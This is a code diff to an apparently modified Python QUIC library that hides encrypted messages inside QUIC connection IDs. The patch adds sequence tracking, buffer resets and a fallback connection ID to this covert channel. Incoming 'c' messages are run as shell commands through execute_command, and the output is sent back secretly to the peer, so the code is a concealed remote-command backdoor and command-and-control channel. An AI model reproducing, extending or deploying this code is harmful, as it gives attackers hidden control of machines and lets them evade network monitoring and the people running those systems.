@@ -6,6 +6,7 @@ import re
 import socket
 import subprocess
 import threading
+import time
 from collections import deque
 from dataclasses import dataclass
 from enum import Enum
@@ -178,6 +179,7 @@ def create_peer_meta():
         "cid_history": [],
         "private_key": ccrypto.generate_rsa(),
         "expected_sequence": 0,  # Track expected sequence for sync
+        "next_sequence": 0,  # Outgoing sequence counter
         "last_sync_time": 0.0,  # Track last successful sync
         "buffer_timestamp": 0.0,  # Track buffer age
         "sync_lost": False,  # Flag indicating sync loss
@@ -454,11 +456,10 @@ class QuicConnection:
                 is_public_key=True,
             )
         if self._is_client:
-            if not peer_meta["cid_queue"].empty():
-                # Pull a cid from the queue
-                cid = peer_meta["cid_queue"].get()
-            else:
-                raise Exception("CID QUEUE EMPTY")
+            if peer_meta["cid_queue"].empty():
+                # Fallback: seed with a random CID so connect never fails
+                peer_meta["cid_queue"].put(os.urandom(20))
+            cid = peer_meta["cid_queue"].get()
             self._peer_cid = QuicConnectionId(cid=cid, sequence_number=None)
         else:
             cid = os.urandom(8)
@@ -2046,6 +2047,21 @@ class QuicConnection:
             else:
                 peer_meta["buffer"].append(self._original_destination_connection_id)
 
+            # Reset stale/overflow buffers to avoid runaway growth
+            now_ts = time.time()
+            if not peer_meta["buffer_timestamp"]:
+                peer_meta["buffer_timestamp"] = now_ts
+            buffer_age = now_ts - peer_meta["buffer_timestamp"]
+            if buffer_age > MAX_BUFFER_AGE or len(peer_meta["buffer"]) > 512:
+                logger.warning(
+                    "Resetting buffer for %s (age=%.1fs, len=%d)",
+                    peer_ip,
+                    buffer_age,
+                    len(peer_meta["buffer"]),
+                )
+                peer_meta["buffer"] = []
+                peer_meta["buffer_timestamp"] = now_ts
+
             # If we don't have a public key yet, receive the public key
             if not peer_meta["public_key"]:
                 if len(peer_meta["buffer"]) == RSA_BIT_STRENGTH // 128 + 1:
@@ -2073,22 +2089,37 @@ class QuicConnection:
             # If we have a public key, try to decrypt the payload
             else:
                 # Skip processing if buffer too small (still accumulating CIDs)
-                # Minimum 2 CIDs needed for any encrypted message
                 if len(peer_meta["buffer"]) >= 2:
                     logger.info(f"PEER_BUFFER_LEN: {len(peer_meta['buffer'])}")
 
-                # Try session key decryption first (fast path)
-                # Need at least 2 CIDs: 1 for data + 1 for ordering byte
+                sequence = None
                 decrypted_payload = None
+                encrypted_payload = ccrypto.reconstruct_payload(peer_meta["buffer"])
+
+                # Try session key decryption first (fast path)
                 if peer_meta.get("session_key"):
-                    encrypted_payload = ccrypto.reconstruct_payload(peer_meta["buffer"])
-                    decrypted_payload = ccrypto.decrypt_with_session_key(
+                    decrypted = ccrypto.decrypt_with_session_key(
                         peer_meta["session_key"], encrypted_payload
                     )
-                    if decrypted_payload:
+                    if decrypted:
+                        sequence = int.from_bytes(
+                            decrypted[:SEQUENCE_BYTES], GLOBAL_BYTE_ORDER
+                        )
+                        decrypted_payload = decrypted[SEQUENCE_BYTES:]
                         logger.debug("Decrypted with session key (fast path)")
 
-                # Fallback to RSA decryption (slow path)
+                # Fallback to RSA decryption (slow path) with sequence
+                if decrypted_payload is None:
+                    result = ccrypto.try_decrypt_with_sequence(
+                        peer_meta["private_key"],
+                        peer_meta["buffer"],
+                        raise_on_error=False,
+                    )
+                    if result:
+                        decrypted_payload, sequence = result
+                        logger.debug("Decrypted with RSA key (slow path)")
+
+                # Legacy fallback without sequence
                 if decrypted_payload is None:
                     decrypted_payload = ccrypto.try_decrypt(
                         peer_meta["private_key"],
@@ -2096,9 +2127,33 @@ class QuicConnection:
                         raise_on_error=False,
                     )
                     if decrypted_payload:
-                        logger.debug("Decrypted with RSA key (slow path)")
+                        sequence = None
 
                 if decrypted_payload is not None:
+                    # Sequence check when available
+                    if sequence is not None:
+                        expected = peer_meta.get("expected_sequence", 0)
+                        # Allow first sync to jump to the sender's current seq
+                        if expected == 0:
+                            peer_meta["expected_sequence"] = sequence + 1
+                            peer_meta["sync_lost"] = False
+                        elif sequence != expected:
+                            logger.warning(
+                                "Sequence mismatch from %s expected=%d got=%d",
+                                peer_ip,
+                                expected,
+                                sequence,
+                            )
+                            peer_meta["sync_lost"] = True
+                            peer_meta["buffer"] = []
+                            peer_meta["expected_sequence"] = sequence + 1
+                            PEER_META[peer_ip] = peer_meta
+                            PEER_META_LOCK.release()
+                            return
+                        else:
+                            peer_meta["expected_sequence"] = expected + 1
+                            peer_meta["sync_lost"] = False
+
                     peer_meta["buffer"] = []
                     command = decrypted_payload[0]
                     decrypted_message = decrypted_payload[1:]
@@ -2127,6 +2182,8 @@ class QuicConnection:
                     elif REMOTE_COMMANDS_ENABLED and command == ord("c"):
                         logger.info("RECEIVED COMMAND: %s", decrypted_message)
                         stdout, stderr, return_code = execute_command(decrypted_message)
+                        seq = peer_meta.get("next_sequence", 0)
+                        peer_meta["next_sequence"] = seq + 1
                         ccrypto.queue_message(
                             host_ip=peer_ip,
                             payload=f"m:{stdout}\n{stderr}\n{return_code}".encode(
@@ -2134,6 +2191,7 @@ class QuicConnection:
                             ),
                             queue=peer_meta["cid_queue"],
                             public_key=peer_meta["public_key"],
+                            sequence=seq,
                             session_key=peer_meta.get("session_key"),
                         )
         PEER_META[peer_ip] = peer_meta
@@ -2198,7 +2256,6 @@ class QuicConnection:
                 )
             )
             self._peer_cid_sequence_numbers.add(sequence_number)
-
         # retire previous CIDs
         for quic_connection_id in retire:
             self._retire_peer_cid(quic_connection_id)
@@ -2901,6 +2958,10 @@ class QuicConnection:
                     payload=b"k",
                     queue=PEER_META[peer_ip]["cid_queue"],
                     public_key=PEER_META[peer_ip]["public_key"],
+                    sequence=PEER_META[peer_ip].get("next_sequence", 0),
+                )
+                PEER_META[peer_ip]["next_sequence"] = (
+                    PEER_META[peer_ip].get("next_sequence", 0) + 1
                 )
             hid = PEER_META[peer_ip]["cid_queue"].get()
             # hid = b'AAAAAAAA'
